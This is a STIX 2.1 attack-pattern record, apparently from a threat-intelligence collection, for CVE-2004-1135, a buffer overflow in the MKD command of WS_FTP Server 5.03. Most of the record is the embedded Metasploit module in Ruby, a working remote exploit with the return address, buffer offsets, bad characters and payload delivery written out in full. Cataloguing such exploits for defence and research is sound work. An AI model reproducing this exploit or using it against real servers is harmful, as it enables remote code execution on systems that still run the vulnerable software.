{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--db375000-9b9f-460f-9c71-5a4904fbfce2",
    "created": "2024-08-14T16:51:01.966337Z",
    "modified": "2024-08-14T16:51:01.966341Z",
    "name": "WS-FTP Server 5.03 MKD Overflow",
    "description": " This module exploits the buffer overflow found in the MKD command in IPSWITCH WS_FTP Server 5.03 discovered by Reed Arvin. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/ftp/wsftp_server_503_mkd.rb",
            "external_id": "wsftp_server_503_mkd.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2004-1135"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::Remote::Ftp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'WS-FTP Server 5.03 MKD Overflow',\n      'Description'    => %q{\n        This module exploits the buffer overflow found in the MKD\n        command in IPSWITCH WS_FTP Server 5.03 discovered by Reed\n        Arvin.\n      },\n      'Author'         => [ 'et', 'Reed Arvin <reedarvin[at]gmail.com>' ],\n      'License'        => BSD_LICENSE,\n      'Platform'       => [ 'win' ],\n      'References'     =>\n        [\n          [ 'CVE', '2004-1135' ],\n          [ 'OSVDB', '12509' ],\n          [ 'BID', '11772'],\n        ],\n      'Privileged'     => false,\n      'Payload'        =>\n        {\n          'Space'    => 480,\n          'BadChars' => \"\\x00\\x7e\\x2b\\x26\\x3d\\x25\\x3a\\x22\\x0a\\x0d\\x20\\x2f\\x5c\\x2e\",\n          'StackAdjustment' => -3500,\n        },\n      'Targets'        =>\n        [\n          [\n            'WS-FTP Server 5.03 Universal',\n            {\n              'Ret'      => 0x25185bb8,\n              # Address is executable to allow XP and 2K\n              # 0x25185bb8 = push esp, ret (libeay32.dll)\n              # B85B1825XX = mov eax,0xXX25185b\n            },\n          ],\n        ],\n      'DisclosureDate' => '2004-11-29',\n      'DefaultTarget' => 0))\n  end\n\n  def check\n    connect\n    disconnect\n    if (banner =~ /5\\.0\\.3/)\n      return Exploit::CheckCode::Appears\n    end\n    return Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    c = connect_login\n    return if not c\n\n    print_status(\"Trying target #{target.name}...\")\n\n    buf         = rand_text_alphanumeric(8192)\n    buf[498, 4] = [ 0x7ffd3001 ].pack('V')\n    buf[514, 4] = [ target.ret ].pack('V')\n    buf[518, 4] = [ target.ret ].pack('V')\n    buf[522, 2] = make_nops(2)\n    buf[524, payload.encoded.length] = payload.encoded\n\n    send_cmd( ['MKD', buf], true );\n\n    handler\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2004-11-29",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}